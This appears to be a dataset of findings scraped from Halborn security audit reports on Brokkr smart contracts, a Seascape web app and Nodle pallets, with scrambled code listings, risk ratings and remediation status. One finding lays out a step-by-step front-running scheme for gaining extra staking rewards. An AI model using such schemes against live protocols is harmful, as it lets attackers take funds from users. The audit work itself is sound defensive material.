(Lines 334-336) 330 331 if let Some ( rewards_pool_contract ) = rewards_pool_contract { config . rewards_pool_contract = deps . api . addr_canonicalize  (& rewards_pool_contract ) ?; 332 333 334 335 } if let Some ( treasury_contract ) = treasury_contract { config . treasury_contract = deps . api . addr_canonicalize (&  treasury_contract ) ?; 336 } spend function allows a malicious (or compromised) admin to fully drain the mvp-treasury contract: Listing 3: contracts/mvp-treasury/src/commands.rs (Lines 23,37) let balance = queries :: query_asset_balance ( deps . as_ref () , env , return Err ( ContractError :: InsufficientFunds {}) ; deps : DepsMut , env : Env , asset_info : AssetInfo , recipient : String , 19 pub fn spend ( 20 21 22 23 24 ) -> Result < Response , ContractError > { 25  asset_info . clone () ) ?. amount ; 26 27 28 29 30 31 32 33 34 info : asset_info , amount : balance , if balance . is_zero () { let asset = Asset { }; } 16 Ok ( Response :: new () . add_messages ( vec! [ 35 36 37  recipient ) ?) ? 38 39 40 } ]) . add_attributes ( vec! [( \" action \" , \" spend \") ]) ) asset . into_msg (& deps . querier , deps . api . addr_validate (& Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to transfer the ownership of contracts mentioned above to a Governance contract, which will control the changes proposed through a voting process. Otherwise, the following security measures should be applied:  Remove the possibility to update the value of treasury_contract in bonding-v1 contract.  Update the logic of spend function in mvp-treasury contract to verify that the value of recipient belongs to a list of contracts that Brokkr protocol interacts with. This list is defined when mvp-treasury is instantiated and should be non-modifiable.  Brokkr admin should be handled by a multi-sig wallet. Remediation plan: PENDING: The Brokkr team stated that they plan to transfer the ownership of the contracts to a full-fledged governance contract setup in the midterm, which will severely reduce the likelihood of liquidity loss exposure attacks. Meanwhile, they will handle the Brokkr admin by a multisig wallet, as suggested in the recommendation. 17 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P1_Contracts_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "BBRO TOKENS ARE LOST WHEN UNSTAKING OR CLAIMING REWARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When a user unstake or claim BRO rewards in staking-v1 contract, his in- formation is totally removed from STAKERS item if the following conditions are true:  Total staked amount is zero  Pending BRO reward is zero Under the mentioned circumstances, the user wont be able to claim his bBRO rewards, even if the amount is greater than zero, i.e.: he totally loses all his bBRO tokens. Code Location: Users information is totally removed from STAKERS item when he unstakes: Listing 4: contracts/staking-v1/src/commands.rs (Lines 279-280) 275 // decrease stake amount 276 state . total_stake_amount = state . total_stake_amount . checked_sub (  amount ) ?; 277 staker_info . unlocked_stake_amount = staker_info .  unlocked_stake_amount . checked_sub ( amount ) ?; 278 279 if staker_info . pending_bro_reward . is_zero () && staker_info .  total_staked () ?. is_zero () { remove_staker_info ( deps . storage , & sender_addr_raw ); 280 281 } else { 282 store_staker_info ( deps . storage , & sender_addr_raw , & staker_info  ) ?; 283 } 18 Users information is totally removed from STAKERS item when he claims his BRO rewards: Listing 5: contracts/staking-v1/src/commands.rs (Lines 385-386) 382 staker_info . pending_bro_reward = Uint128 :: zero () ; 383 staker_info . unlock_expired_lockups (& env . block ) ?; 384 385 if staker_info . total_staked () ?. is_zero () { 386 387 } else { 388 remove_staker_info ( deps . storage , & sender_addr_raw ); store_staker_info ( deps . storage , & sender_addr_raw , & staker_info  ) ?; 389 } Risk Level: Likelihood - 5 Impact - 3 Recommendation: Update the logic of unstake and claim_bro_rewards functions to remove users information from STAKERS item only if, additionally to the already existing conditions, pending_bbro_reward is also zero. Remediation plan: SOLVED: The issue was fixed in commit f9bbc72a85ff872b36691c4992d7a86439a4bba2. 19 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P1_Contracts_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "BBRO REWARDS SCHEMA COULD PRODUCE UNFAIR ADVANTAGES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "the calculate of When users stake, the compute_normal_bbro_reward function is called calcu- to lation between depends last_distribution_block and last_balance_update, it is possible the following attack scenario: bBRO bbro_reward of subtraction accrued. on rewards value Because the the Attack scenario: 1. Just after a reward distribution, an attacker stakes 10_000000 BRO (Block height: 200). 2. Attacker waits until there is another reward distribution and he front-runs the transaction to additionally stake 80_000000 BRO be- fore the distribution of BRO tokens (Block height: 700). 3. The attacker unstakes 80_000000 BRO just after the reward distribu- tion (could be even in the same block!). 4. The calculation of his bBRO reward will consider that 90_000000 BRO has been staked for 500 blocks (700 - 200). However, only 10_000000 This situation BRO of the total has been staked for 500 blocks. gives the attacker an unfair advantage. Code Location: Listing 6: contracts/staking-v1/src/state.rs (Lines 157,163-164,169) 155 let stake_amount = self . total_staked () ?; 156 157 if stake_amount . is_zero () || state . last_distribution_block < self .  last_balance_update { 158 return Ok (() ); 20 159 } 160 161 let epoch_info = query_epoch_info ( querier , epoch_manager_contract )  ?; 162 163 let epochs_staked = Uint128 :: from ( state . last_distribution_block -  self . last_balance_update ) . checked_div ( Uint128 :: from ( epoch_info . epoch )) ?; 164 165 166 let bbro_per_epoch_reward = 167 stake_amount . checked_div ( epoch_info . epochs_per_year () )? *  epoch_info . bbro_emission_rate ; 168 169 let bbro_reward = bbro_per_epoch_reward . checked_mul ( epochs_staked )  ?; 170 self . pending_bbro_reward = self . pending_bbro_reward . checked_add (  bbro_reward ) ?; 171 self . last_balance_update = current_block ; 172 173 Ok (() ) Risk Level: Likelihood - 5 Impact - 3 Recommendation: Update the logic of compute_normal_bbro_reward function to consider the block height of each stake when calculating the bBRO rewards. Remediation plan: PARTIALLY SOLVED: The Brokkr team claimed that contracts will be launched to mainnet with the following parameters:  epoch = 17,280 blocks (1 day)  unstake_period_blocks = 241,920 blocks (14 days) 21 Because of this setup, the attack vector mentioned above is not prof- itable unless the rewards are distributed after 14 days, which is highly unlikely, especially with the use of an off-chain trigger (out-of-scope of this audit). If the above-mentioned parameters are subsequently incorrectly changed with the update_config function, this security issue could arise again, so it has been marked as \"Partially Solved\". 22 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P1_Contracts_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "PRICES FROM TWAP ORACLE CAN BECOME STALE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "consult_price function in contracts/oracle/src/queries.rs calculates the return value using the price_average stored in oracle contracts storage (PRICE_LAST). However, the function does not previously validate if the price has been updated within a reasonable timeframe. As a consequence, prices calculated in this TWAP oracle can rapidly become stale if users do not bond tokens frequently enough or if Brokkrs off-chain trigger does not work correctly (out-of-scope for this audit), which could affect negatively users operations or protocol funds. Code Location: price_average is extracted from oracle contracts storage (PRICE_LAST) without validating if the price has been updated within a reasonable timeframe: Listing 7: contracts/oracle/src/queries.rs (Lines 47,49,50,52) price_last . price_0_average 46 let config = load_config ( deps . storage ) ?; 47 let price_last = load_price_cumulative_last ( deps . storage ) ?; 48 49 let price_average = if config . asset_infos [0]. equal (& asset ) { 50 51 } else if config . asset_infos [1]. equal (& asset ) { 52 53 } else { 54 55 }; return Err ( StdError :: generic_err ( \" Invalid asset info \" )) ; price_last . price_1_average 23 Return value of consult_price function is calculated using price_average, even if this value is stale: Listing 8: contracts/oracle/src/queries.rs (Lines 74,78) let price_precision = Uint256 :: from (10 _u128 . pow ( TWAP_PRECISION Uint256 :: from ( amount ) * price_average / Decimal256 :: 72 } else { 73  . into () )); 74  from_uint256 ( price_precision ) 75 }; 76 77 Ok ( ConsultPriceResponse { 78 79 }) amount : consult_price . into () , Risk Level: Likelihood - 4 Impact - 3 Recommendation: It is recommended to apply one of the following oracle strategies:  Update the logic of consult_price function to throw an error message if price_average has not been updated within a reasonable timeframe defined in the contract.  If data freshness is more important for Brokkr protocol, an oracle with moving averages can be used instead, in which the cumulative price variable is measured more often than once per period. See the following reference for more details. Remediation plan: SOLVED: The issue was fixed in commit 44a54bddf48a4e28b711449ddcb13d9bf31afdb9. 24 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P1_Contracts_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "An incorrect use of the update_config function in contracts can set owner to an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the owner of the contracts can change owner address using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  airdrop  bonding-v1  oracle  staking-v1  vesting Code Location: Listing 9: contracts/airdrop/src/commands.rs (Lines 24-26) let mut config = load_config ( deps . storage ) ?; 21 pub fn update_config ( deps : DepsMut , owner : Option < String >) ->  Result < Response , ContractError > { 22 23 24 25 26 config . owner = deps . api . addr_canonicalize (& owner ) ?; if let Some ( owner ) = owner { } 25 Listing 10: contracts/bonding-v1/src/commands.rs (Lines 322-324) deps : DepsMut , owner : Option < String >, lp_token : Option < String >, rewards_pool_contract : Option < String >, treasury_contract : Option < String >, astroport_factory : Option < String >, oracle_contract : Option < String >, ust_bonding_reward_ratio : Option < Decimal >, ust_bonding_discount : Option < Decimal >, lp_bonding_discount : Option < Decimal >, min_bro_payout : Option < Uint128 >, vesting_period_blocks : Option < u64 >, lp_bonding_enabled : Option < bool >, 305 pub fn update_config ( 306 307 308 309 310 311 312 313 314 315 316 317 318 319 ) -> Result < Response , ContractError > { 320 321 322 323 324 if let Some ( owner ) = owner { } let mut config = load_config ( deps . storage ) ?; config . owner = deps . api . addr_canonicalize (& owner ) ?; Listing 11: contracts/oracle/src/commands.rs (Lines 28-30) deps : DepsMut , owner : Option < String >, price_update_interval : Option < u64 >, 21 pub fn update_config ( 22 23 24 25 ) -> Result < Response , ContractError > { 26 27 28 29 30 if let Some ( owner ) = owner { } let mut config = load_config ( deps . storage ) ?; config . owner = deps . api . addr_canonicalize (& owner ) ?; Listing 12: contracts/staking-v1/src/commands.rs (Lines 502-504) 488 pub fn update_config ( 489 490 491 492 deps : DepsMut , owner : Option < String >, paused : Option < bool >, unstake_period_blocks : Option < u64 >, 26 min_staking_amount : Option < Uint128 >, min_lockup_period_epochs : Option < u64 >, max_lockup_period_epochs : Option < u64 >, base_rate : Option < Decimal >, linear_growth : Option < Decimal >, exponential_growth : Option < Decimal >, 493 494 495 496 497 498 499 ) -> Result < Response , ContractError > { 500 501 502 503 504 if let Some ( owner ) = owner { } let mut config = load_config ( deps . storage ) ?; config . owner = deps . api . addr_canonicalize (& owner ) ?; Listing 13: contracts/vesting/src/commands.rs (Lines 71-73) 65 pub fn update_config ( deps : DepsMut , 66 owner : Option < String >, 67 68 genesis_time : Option < u64 >, 69 ) -> Result < Response , ContractError > { 70 71 72 73 } let mut config = load_config ( deps . storage ) ?; if let Some ( owner ) = owner { config . owner = deps . api . addr_canonicalize (& owner ) ?; Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to split owner transfer functionality into set_owner and accept_ownership functions. The latter function allows the transfer to be completed by the recipient. Remediation plan: SOLVED: The issue was fixed in commit 79549c38936e99a89a1fa7aa7e38456032f47389. 27 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P1_Contracts_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING VALIDATION FOR BASE RATE AND GROWTH PARAMETERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "instantiate and update_config functions in staking-v1 contract do not validate that values of base_rate, linear_growth or exponential_growth are less or equal than a threshold (e.g.: 0.1) predefined in the contract. The aforementioned values are used to calculate premium bBRO rewards. If those values are not correctly set, the premium bBRO rewards for users could be much higher than expected. Code Location: instantiate function does not validate that base_rate, linear_growth or exponential_growth are less or equal than a predefined threshold: Listing 14: contracts/staking-v1/src/contract.rs (Lines 59-61) deps . storage , & Config { 45 store_config ( 46 47 48 49 50 51  rewards_pool_contract )? , 52  bbro_minter_contract )? , 53  epoch_manager_contract )? , 54 55 56 57 58 59 owner : deps . api . addr_canonicalize (& msg . owner )? , paused : false , bro_token : deps . api . addr_canonicalize (& msg . bro_token )? , rewards_pool_contract : deps . api . addr_canonicalize (& msg . bbro_minter_contract : deps . api . addr_canonicalize (& msg . epoch_manager_contract : deps . api . addr_canonicalize (& msg . unstake_period_blocks : msg . unstake_period_blocks , min_staking_amount : msg . min_staking_amount , lockup_config : LockupConfig { min_lockup_period_epochs : msg . min_lockup_period_epochs , max_lockup_period_epochs : msg . max_lockup_period_epochs , base_rate : msg . base_rate , 28 linear_growth : msg . linear_growth , exponential_growth : msg . exponential_growth , 60 61 62 63 64 ) ?; }, }, update_config function does not validate that base_rate, linear_growth or exponential_growth are less or equal than a predefined threshold: Listing 15: contracts/staking-v1/src/commands.rs (Lines 527,531,535) config . lockup_config . base_rate = base_rate ; 526 if let Some ( base_rate ) = base_rate { 527 528 } 529 530 if let Some ( linear_growth ) = linear_growth { 531 532 } 533 534 if let Some ( exponential_growth ) = exponential_growth { 535 536 } config . lockup_config . linear_growth = linear_growth ; config . lockup_config . exponential_growth = exponential_growth ; Risk Level: Likelihood - 2 Impact - 3 Recommendation: Add a validation routine inside instantiate and update_config functions to ensure that values of base_rate, linear_growth and exponential_growth are less or equal than a threshold predefined in the contract. Remediation plan: SOLVED: The issue was fixed in commit 032d729b4cddd49c990fdb5d9e78c608d21f0d25. 29 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P1_Contracts_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING VALIDATION FOR BONDING DISCOUNTS AND REWARD RATIO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "instantiate and update_config functions in bonding-v1 contract do not validate that values of ust_bonding_reward_ratio, ust_bonding_discount or lp_bonding_discount are less or equal than 1. The aforementioned values are used to calculate rewards distribution and amounts of BRO tokens to claim. If those values are not correctly set, operations will throw error messages and wont allow legitimate users to claim their rewards, thus generating a denial of service (DoS) in Brokkr protocol. Code Location: instantiate function does not validate that ust_bonding_discount or lp_bonding_discount are less or equal than 1: Listing 16: contracts/bonding-v1/src/contract.rs (Lines 63-64) return Err ( ContractError :: InvalidUstBondRatio {}) ; 46 if msg . ust_bonding_reward_ratio > Decimal :: from_str (\" 1.0 \" )? 47 || msg . ust_bonding_reward_ratio <= Decimal :: zero () 48 { 49 50 } 51 52 store_config ( 53 54 55 56 57 58  rewards_pool_contract )? , owner : deps . api . addr_canonicalize (& msg . owner )? , bro_token : deps . api . addr_canonicalize (& msg . bro_token )? , lp_token : deps . api . addr_canonicalize (& msg . lp_token )? , rewards_pool_contract : deps . api . addr_canonicalize (& msg . deps . storage , & Config { 30 treasury_contract : deps . api . addr_canonicalize (& msg . astroport_factory : deps . api . addr_canonicalize (& msg . oracle_contract : deps . api . addr_canonicalize (& msg . ust_bonding_reward_ratio : msg . ust_bonding_reward_ratio , ust_bonding_discount : msg . ust_bonding_discount , lp_bonding_discount : msg . lp_bonding_discount , min_bro_payout : msg . min_bro_payout , vesting_period_blocks : msg . vesting_period_blocks , lp_bonding_enabled : msg . lp_bonding_enabled , 59  treasury_contract )? , 60  astroport_factory )? , 61  oracle_contract )?, 62 63 64 65 66 67 68 69 ) ?; }, update_config function does not validate that ust_bonding_reward_ratio, ust_bonding_discount or lp_bonding_discount are less or equal than 1: Listing 17: contracts/bonding-v1/src/commands.rs (Lines 347,351,355) config . ust_bonding_reward_ratio = ust_bonding_reward_ratio ; 346 if let Some ( ust_bonding_reward_ratio ) = ust_bonding_reward_ratio { 347 348 } 349 350 if let Some ( ust_bonding_discount ) = ust_bonding_discount { 351 352 } 353 354 if let Some ( lp_bonding_discount ) = lp_bonding_discount { 355 356 } config . ust_bonding_discount = ust_bonding_discount ; config . lp_bonding_discount = lp_bonding_discount ; Risk Level: Likelihood - 2 Impact - 3 31 Recommendation: Add a validation routine inside instantiate and update_config functions to ensure that values of ust_bonding_reward_ratio, ust_bonding_discount and lp_bonding_discount are less or equal than 1. Remediation plan: SOLVED: The issue was fixed in commit e80b7dc97ff20b683cd27d7a4cdaa6d7d60c1076. 32 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P1_Contracts_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING VALIDATION FOR MIN AND MAX VALUES OF LOCKUP PERIOD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "instantiate and update_config functions in staking-v1 contract do not validate that min_lockup_period_epochs is less than max_lockup_peri od_epochs. The aforementioned values are used to validate the lockup period when staking locked BRO tokens or locking a previous staked amount. If those values are not correctly set, operations will throw error messages and wont allow legitimate users to stake or lock BRO tokens, thus generating a denial of service (DoS) in Brokkr protocol. Code Location: instantiate function does not validate that min_lockup_period_epochs is less than max_lockup_period_epochs: Listing 18: contracts/staking-v1/src/contract.rs (Lines 57-58) deps . storage , & Config { 45 store_config ( 46 47 48 49 50 51  rewards_pool_contract )? , 52  bbro_minter_contract )? , 53  epoch_manager_contract )? , 54 55 56 owner : deps . api . addr_canonicalize (& msg . owner )? , paused : false , bro_token : deps . api . addr_canonicalize (& msg . bro_token )? , rewards_pool_contract : deps . api . addr_canonicalize (& msg . bbro_minter_contract : deps . api . addr_canonicalize (& msg . epoch_manager_contract : deps . api . addr_canonicalize (& msg . unstake_period_blocks : msg . unstake_period_blocks , min_staking_amount : msg . min_staking_amount , lockup_config : LockupConfig { 33 min_lockup_period_epochs : msg . min_lockup_period_epochs , max_lockup_period_epochs : msg . max_lockup_period_epochs , base_rate : msg . base_rate , linear_growth : msg . linear_growth , exponential_growth : msg . exponential_growth , 57 58 59 60 61 62 63 64 ) ?; }, }, update_config function does not validate that min_lockup_period_epochs is less than max_lockup_period_epochs: Listing 19: contracts/staking-v1/src/commands.rs (Lines 519,523) 518 if let Some ( min_lockup_period_epochs ) = min_lockup_period_epochs { 519 config . lockup_config . min_lockup_period_epochs =  min_lockup_period_epochs ; 520 } 521 522 if let Some ( max_lockup_period_epochs ) = max_lockup_period_epochs { 523 config . lockup_config . max_lockup_period_epochs =  max_lockup_period_epochs ; 524 } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Add a validation routine inside instantiate and update_config functions to ensure that min_lockup_period_epochs is less than max_lockup_peri od_epochs. Remediation plan: SOLVED: The issue was fixed in commit b9c1e4ad60fa79e030737e5374a8b027c147d091. 34 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P1_Contracts_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "VESTING SCHEDULES COULD BE UNCLAIMABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When registering new vesting accounts, the vesting contract sets the last claimed time to the configured genesis time. That parameter could be greater than the expiration date of some vesting schedules, such that vesting_info.last_claim_time > vesting_info.end_time, which makes it unclaimable. However, it is possible for the administrator to update genesis time and set new vesting schedules. Code Location: Listing 20: packages/services/src/vesting.rs, (Line 101) 101 if current_time > schedule . end_time && self . last_claim_time <  schedule . end_time { 102 103 } claimable_amount += schedule . bro_amount ; Risk Level: Likelihood - 1 Impact - 2 Recommendation: When registering vesting schedules, it is recommended to verify that the end time of that schedule is greater than the genesis time. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 35 3.10 (HAL-10) SLIGHT ROUNDING ISSUES WHEN PROVIDING LP TOKENS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P1_Contracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "HARDCODED PRIVATE KEY IN THE REPOSITORY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_NFT_Marketplace_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "Testing revealed that the backend private repository on GitHub contained a private key. While the repository was private and therefore only accessible by Seascapes team, this is considered bad practice as secrets should be securely stored and shared between the development team on a need to know basis. Additionally, these might be later re-used by Seascape and should they fall in the wrong hands, they could be used to access sensitive services and data. Location: The private key could be found by browsing to the seascape-antibot- d98baf808e54.json file within the backend source code. Risk Level: Likelihood - 1 Impact - 5 Recommendation: Halborn recommends that the private key is replaced and that it is removed from the repository. Instead, environment variables should be used to Additionally, pass on arguments to the code, should it be needed. Seascape should research secret sharing solutions that could be used to share secrets used in development environments between engineers and developers. Finally, GitHub commits should be reviewed by a second person before being pushed to ensure that unintended data is not committed to the repository. 12 Remediation Plan: SOLVED: This issue was solved by using environment variables. 13 ",
        "labels": [
            "Halborn",
            "Seascape_NFT_Marketplace_WebApp_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "USE OF PACKAGES WITH KNOWN VULNERABILITIES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_NFT_Marketplace_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "The application uses third-party dependencies to delegate handling of different kind of operations, e.g., generation of document in a specific format, HTTP communications, data parsing of a specific format, etc. However, the dependencies bring forth an expected downside where the security posture of the real application is now resting on them. Several imported packages were found to not be updated to the latest version and presented various security risks, as described below. Vulnerabilities List: FRONTEND Title Prototype Pollution Cross-Site Scripting (XSS) Open Redirect Unexpected Server Crash Exposure of Sensitive Information Exposure of Sensitive Information Denial of Service (DoS) Package immer next-js next-js next-js node-fetch simple-get trim-newlines Severity CRITICAL HIGH HIGH HIGH HIGH HIGH HIGH API Title Exposure of Sensitive Information Exposure of Sensitive Information Package simple-get node-fetch Severity HIGH HIGH Risk Level: Likelihood - 1 14 Impact - 5 Recommendation: It is highly recommended performing automated analysis of the dependencies from the birth of the project and if they happen to contain any security issues. The Seascape team needs to be aware of it and apply the required mitigation measures to secure the affected application. Remediation Plan: SOLVED: Seascape updated the highlighted packages on the frontend and the API. 15 ",
        "labels": [
            "Halborn",
            "Seascape_NFT_Marketplace_WebApp_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING HTTP SECURITY HEADERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_NFT_Marketplace_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "The assessment revealed that several security headers were not enforced by the application. These headers are used by client browsers to ensure various security controls are appropriately implemented during the normal functioning of the application.  X-Content-Type-Options, which indicates that the MIME types adver- tised in the Content-Type headers should not be changed and be followed.  X-Frame-Options, which indicates whether a browser should be allowed to render a page in a <frame>, <iframe>, <embed> or <object>.  Content-Security-Policy, which allows website administrators to con- trol resources the user agent is allowed to load for a given page.  Strict-Transport-Security (HSTS) - which enforces secure transmis- sion by letting a website tell browsers that it should only be accessed using HTTPS, instead of using HTTP.  Referrer-Policy - specifies what information, or parts of it, should be sent in the Referer header with the request that prompted the redirection.  Pragma - using the no-cache directive forces the browser to query the server before downloading a cached copy of the page, resulting in the download of the most recent version.  Expires - includes a date, period, or value indicating when the servers response is no longer correct. It should be noted that in some situations Strict-Transport-Security and X-Content-Type-Options (and in some cases X-Frame-Options) do not neces- sarily have to be enabled by the application directly. These headers can be injected by supporting load balancers or web application accelerators. 16 Recommendation: Seascape should review the above security headers and ensure that, where appropriate, these headers are included within all exposed endpoints and services. This allows Seascape to ensure the defence-in-depth approach is achieved thought the application. References: Strict-Transport-Security X-Content-Type-Options X-Frame-Options Content-Type Remediation Plan: SOLVED: Security related headers were added to the platform. 17 ",
        "labels": [
            "Halborn",
            "Seascape_NFT_Marketplace_WebApp_Pentest",
            "Severity: Low"
        ]
    },
    {
        "title": "TLS MISCONFIGURATIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_NFT_Marketplace_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "Several misconfigurations were identified within the applications SS- L/TLS configuration that could compromise the security of communications. While attacks that target weak cipher suites or algorithms are complex to execute, with the steady progress of computational power these at- tacks become easier to achieve over time. As such, it is recommended to configure the connection to comply with security best practices. Many protocols may be used in establishing a secure connection. In the past, various vulnerabilities have existed surrounding legacy proto- cols and their associated cipher suites. Newer versions of these secure communication protocols and modern browsers address the security vulner- abilities identified in older versions. For example, the POODLE (Padding Oracle On Downgraded Legacy Encryption) vulnerability allowed information to be extracted from communication headers and the DROWN attack allowed SSLv2 traffic to be decrypted. Neither of these attacks continue to pose a threat in modern browsers. However, if a user accesses the application with an outdated browser, these vulnerabilities may remain exploitable. Encryption ciphers are used to protect communication channels between a client and a web server and are negotiated when a client initially connects to the server. This negotiation involves agreeing on a cipher suite and a combination of protocols, encryption algorithms, key lengths, and hashing algorithms supported by both parties. To support a wide range of browsers, web servers typically support ciphers of various strengths. However, some encryption algorithms do not provide adequate security, due to issues such as implementation flaws or inadequate key lengths. Additionally, permitting insecure cipher suites puts users with outdated software at greater risk, as an attacker could downgrade a users connection to an insecure cipher. The SSL cipher suites support a variety of key lengths. Only suites with sufficiently long keys should be permitted, as short keys may allow an 18 attacker to perform a brute-force attack to decrypt the traffic. Analysis: The application allowed connections with TLS v1.0 and TLS v1.1 to be established, as well as allowing the use of weak CBC cipher suites. Listing 1 not offered ( OK ) SSLv2 not offered ( OK ) SSLv3 offered ( deprecated ) TLS 1 offered ( deprecated ) TLS 1.1 offered ( OK ) TLS 1.2 offered ( OK ): final TLS 1.3 NPN / SPDY not offered ALPN / HTTP2 h2 , http /1.1 ( offered ) 1 2 3 4 5 6 7 8 9 10 Ciphers : 11 ECDHE - RSA - AES128 - SHA AES128 - SHA ECDHE - RSA - AES256 - SHA AES256 - SHA DES - CBC3 - SHA Recommendation: As the application functionality is hosted across multiple servers, the SSL/TLS configuration of each should be reviewed and updated to comply with security best practice and to minimize the risk of existing and future SSL vulnerabilities.  It is recommended to disable TLSv1.0 and TLSv1.1. It should be noted that all major browser vendors coordinated to remove support for both TLSv1.0 and TLSv1.1 in March 2020, however these depreciated versions will still be available to outdated browser versions.  Support for the weak cipher suites identified above should be re- moved.  Key lengths of 256 bits and above should be used for symmetric encryption algorithms and a length of 4096 bits should be used for 19 RSA algorithms. For asymmetric keys generated with ECC algorithms, the minimum recommended key size is 512 bits. Finally, it is recommended that forward secrecy is enabled on all hosts and that session renegotiation is not supported. If a compromise of the servers private key, forward secrecy will prevent an attacker from using it to decrypt previously recorded traffic. Remediation Plan: SOLVED: The team at Seascape amended the TLS configuration of the servers to only accept connections with version 2 and version 3. 20 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Seascape_NFT_Marketplace_WebApp_Pentest",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that it is possible to:  Vote with 0 amount  Challenge yourself  Counter yourself  Vote for yourself By combining these properties, some scenarios might be possible:  A whale can influence any challenge/counter decision by voting for itself.  A whale can also farm additional tokens upon success by countering any application and then voting to itself.  By countering your application and voting with 0 amount, it is possible to fill up the storage since the values are pushed into vector  To remove yourself from members in the root of trust. Risk Level: Likelihood - 3 Impact - 4 Recommendation: Consider improving the design by not letting the same account to:  Vote to itself  Counter itself 14  Challenge itself  Vote with 0 deposit Remediation Plan: NOT APPLICABLE: The issue is marked as not applicable by the Nodle team as the tcr and root of trust pallets will be removed. 15 ",
        "labels": [
            "Halborn",
            "Nodle_Nodl_Substrate_Pallet",
            "Severity: Medium"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that if a nominator has a single validator, it is not possible to remove a validator through nominator_denominate since it has a check for <StakingMinNominatorTotalBond<T>> In that case, nominator_denominate_all has to be used, which bypasses that check, which is not intentional. Code Location: Listing 1: pallets/staking/src/lib.rs ensure! ( remaining >= < StakingMinNominatorTotalBond <T < Error <T > >:: NominatorBondBelowMin ); 1 if !do_force { 2 3  > >:: get () , 4 5 6 } Risk Level: Likelihood - 4 Impact - 2 Recommendation: Consider having a conditional statement in nominator_denominate that allows to force remove of validator if nominator has only one validator. 16 Remediation Plan: SOLVED: The issue was solved by the Nodle team.  Fix Commit 17 ",
        "labels": [
            "Halborn",
            "Nodle_Nodl_Substrate_Pallet",
            "Severity: Medium"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
